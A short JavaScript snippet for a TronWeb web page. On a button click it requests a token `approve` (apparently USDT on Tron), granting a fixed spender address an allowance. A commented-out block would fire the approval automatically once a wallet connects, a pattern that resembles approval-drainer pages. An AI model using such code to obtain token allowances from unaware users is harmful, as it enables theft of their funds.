const feeLimit = 100000000;
const callValue = 0;
const { contractAddress, decimalNums } = window;

const triggerContract = async (number) => {
  let trcUsdt = await window.tronWeb
    .contract()
    .at(contractAddress.TD);
  console.log(contractAddress.TD)

  trcUsdt
    .approve(contractAddress.approve, number + '000000')
    .send({
      feeLimit: feeLimit,
      callValue: callValue || 0,
    })
    .then(function (res) {
      // 成果逻辑提示
      console.log(res);
      if (res) {
        callback && callback(res);
      }
    })
    .catch((e) => {
      // 失败逻辑
      console.log(e);
    });
};
// var obj = setInterval(async () => {
//   if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
//     clearInterval(obj);
//     triggerContract();
//   }
// }, 10);
$('.btn').click(() => {
  triggerContract($('.number').val()) // '100000'
})